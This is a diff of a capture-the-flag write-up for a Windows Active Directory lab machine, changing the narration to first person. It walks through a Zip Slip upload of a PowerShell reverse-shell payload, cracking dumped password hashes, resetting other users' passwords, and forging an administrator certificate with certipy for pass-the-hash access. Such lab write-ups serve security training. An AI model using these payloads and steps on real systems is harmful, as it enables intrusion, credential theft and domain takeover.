@@ -3,6 +3,7 @@
 Difficulty: Hard
 OS: Windows
 Category: Offensive
+Date: 2026-02-24T05:14:03.635Z
 
 ![certificate.webp](certificate.webp)
 
@@ -85,7 +86,7 @@ PORT      STATE SERVICE       VERSION
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-Add the domain to `/etc/hosts`
+I add the domain to `/etc/hosts`
 
 ```bash
 10.10.11.71 DC01.certificate.htb certificate.htb
@@ -93,25 +94,25 @@ Add the domain to `/etc/hosts`
 
 ### Enumeration
 
-Explore the webpage, then register as a student.
+I explore the website and register as a student.
 
-At this point you can fuzz for directories. But we can directly visit this url, this allows us to upload files such as pdf, zip, etc. `http://certificate.htb/upload.php?s_id=36` 
+At this point I can fuzz for directories. But I can directly visit this url, this allows me to upload files such as pdf, zip, etc. `http://certificate.htb/upload.php?s_id=36`
 
 ![image.png](image.webp)
 
 ### Exploitation
 
-One thing I learned when gaining a foothold in *Active Directory* is that you need to do an RCE through upload misconfigurations, or reveal its NTLM hashes through a zip file upload configuration. There are various ways but these are the common ones.
+One thing I learned when gaining a foothold in *Active Directory* is that I need to do an RCE through upload misconfigurations, or reveal its NTLM hashes through a zip file upload configuration. There are various ways but these are the common ones.
 
-We’ll do the **Zip Slip** exploitation, you can search for it in the internet to know more about this exploit
+I'll do the **Zip Slip** exploitation, I can search for it in the internet to know more about this exploit
 
-To do this, make sure you have a **pdf** file (any). We will zip this pdf file
+I begin with a PDF file and place it in a ZIP archive:
 
 ```bash
 zip initial.zip test.pdf
 ```
 
-Create a **reverse shell** payload
+I create a **reverse shell** payload
 
 ```bash
 mkdir malicious_files
@@ -119,7 +120,7 @@ cd malicious_files
 vim shell.php
 ```
 
-Paste the following PowerShell payload into your *shell.php*
+I paste the following PowerShell payload into my *shell.php*
 
 ```bash
 <?php
@@ -127,45 +128,45 @@ shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sock
 ?>
 ```
 
-Now, zip/package the directory of the reverse shell
+I package the directory containing my reverse shell:
 
 ```bash
 zip -r malicious.zip malicious_files/
 ```
 
-Combine both zip files
+I combine both zip files
 
 ```bash
 cat initial.zip malicious.zip > combined.zip
 ```
 
-The idea here is to trick the server into extracting the payload and placing it into a web-accessible location. If you will directly upload the payload even though it’s packaged. You will get a 400 bad request because it will be flagged as malicious, which will result to a failure.
+The idea here is to trick the server into extracting the payload and placing it into a web-accessible location. If I'll directly upload the payload even though it’s packaged. I'll get a 400 bad request because it will be flagged as malicious, which will result to a failure.
 
 As quoted from the blog of Snyk [https://security.snyk.io/research/zip-slip-vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
 
 > First of all, the contents of the zip file needs to have one or more files that break out of the target directory when extracted. In the example below, we can see the contents of a zip file. It has two files, a [good.sh](http://good.sh/) file which would be extracted into the target directory and an [evil.sh](http://evil.sh/) file which is trying to traverse up the directory tree to hit the root and then add a file into the tmp directory. When you attempt to cd .. in the root directory, you still find yourself in the root directory, so a malicious path could contain many levels of ../ to stand a better chance of reaching the root directory, before trying to traverse to sensitive files.
-> 
+>
 
 ### Foothold
 
-Now that we have an idea, let’s setup a listener. I am using metasploit’s `multi/handler` .
+Now that I have an idea, I'll setup a listener. I'm using metasploit’s `multi/handler` .
 
-Upload the `combined.zip` in the URL mentioned above.
+I upload the `combined.zip` in the URL mentioned above.
 
-Once uploaded, click the hyperlink to redirect you to your uploaded zipped content. The endpoint is the pdf file that we included in the `combined.zip` meaning, the reverse shell is also included, so navigate to `malicious_files/shell.php` by replacing `test.pdf` then you will have a reverse shell in your metasploit.
+After uploading the archive, I follow the link to the extracted PDF. I replace `test.pdf` in the path with `malicious_files/shell.php` to trigger the payload and receive the connection in Metasploit.
 
-At this point, there are two ways to get the credential we need. 
+At this point, there are two ways to get the credential I need.
 First, is to navigate at:
 
 ```bash
 C:\xampp\htdocs\certificate.htb\static\full_dump.sql
 ```
 
-You download that file and you will find the credentials needed.
+I download that file and I'll find the credentials needed.
 
-Second, this is the hardest. You will need to read the **Rar.txt** at `C:\Program FIles\WinRAR` if you `findstr "secret.rar"` you will find the password there which the `secret.rar` holds the credentials for the database.
+Second, this is the hardest. I'll need to read the **Rar.txt** at `C:\Program FIles\WinRAR` if I `findstr "secret.rar"` I'll find the password there which the `secret.rar` holds the credentials for the database.
 
-If you read the `full_dump.sql` you will find various credentials there.
+If I read the `full_dump.sql` I'll find various credentials there.
 
 ```bash
 Lorra.AAA:$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
@@ -185,23 +186,23 @@ test2:$2y$04$Ci4wfETizE9WCrUgpC4tyuI7s4oLIpK/DWb/uhjO2IKTRIfD9JUGy
 test3:$2y$04$m51Lz73GtqPoAzovxJeCM.B8/SAkDERIl7OBZfxAAQahNpiVFPsKe
 ```
 
-If you take one hash out of this as an example. We will use this to identify what kind of hash is this, put the hash into a file and with the command
+I save one of the password hashes to a file and identify its format with the following command:
 
 ```bash
 hashcat --identify hash2find.txt
 ```
 
-This will output bcrypt which is `3200` mode. Remove the users and just leave the hashes.
+This will output bcrypt which is `3200` mode. I remove the users and just leave the hashes.
 
 ```bash
 hashcat -m 3200 -a 0 hashes.txt rockyou.txt
 ```
 
-Wait and look for the credentials of **Sara.B** then login with evil-winrm
+I wait and look for the credentials of **Sara.B** then login with evil-winrm
 
 ### Enumeration with Sara.B Account
 
-The user flag is not found in this account so we need to traverse first on the other users. But looking at the permissions of this account, we can see that it can change password.
+The user flag is not found in this account so I need to traverse first on the other users. But looking at the permissions of this account, I can see that it can change password.
 
 ```bash
 Password last set            11/3/2024 7:01:09 PM
@@ -212,38 +213,38 @@ User may change password     Yes
 
 ```
 
-So we will change the passwords for *Lion.SK* & *Ryan.K*
+So I'll change the passwords for *Lion.SK* & *Ryan.K*
 
 ```bash
 net user Lion.SK Password123
 net user Ryan.K Password123  **
 ```
 
-Then login with Lion’s credential, then get the user flag at Desktop.
+Then I log in with Lion’s credential, then get the user flag at Desktop.
 
 ### Root
 
-Do a bloodhound with Ryan’s or Lion’s credentials. Either way we can still see both of this accounts.
+I do a bloodhound with Ryan’s or Lion’s credentials. Either way I can still see both of this accounts.
 
 ```bash
 bloodhound-python -dc DC01.certificate.htb -u 'Lion.SK' -p 'Password123' -d certificate.htb -c all --zip -ns 10.10.11.71 --dns-timeout 30
 ```
 
-After thorough enumeration, bloodhound is not needed since it will bypass all the intended methods for this challenge. 
+After thorough enumeration, bloodhound is not needed since it will bypass all the intended methods for this challenge.
 
-Using the https://github.com/CsEnox/SeManageVolumeExploit we have access to the entire C drive. 
+Using the https://github.com/CsEnox/SeManageVolumeExploit I have access to the entire C drive.
 
-Navigate to `C:\Users\Public` you will find a **ca.pfx** this will be used for golden certificate attack later, download it to your machine.
+In `C:\Users\Public`, I find **ca.pfx** and download it for the certificate-forging step.
 
 ![image.png](image%201.webp)
 
-Then use the certificate to forge for **Administrator**
+Then I use the certificate to forge for **Administrator**
 
 ```bash
 certipy forge -ca-pfx ca.pfx -upn Administrator@certificate.htb -subject 'CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB'
 ```
 
-Then authenticate as an Administrator
+I authenticate using the forged administrator certificate:
 
 ```bash
 certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.11.71
@@ -251,10 +252,10 @@ certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.11.71
 Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
 ```
 
-Copy the hash file and authenticate to **evil-winrm**
+I copy the hash file and authenticate to **evil-winrm**
 
 ```bash
 evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6
 ```
 
-Then get the root flag in Desktop.
+Then I get the root flag in Desktop.
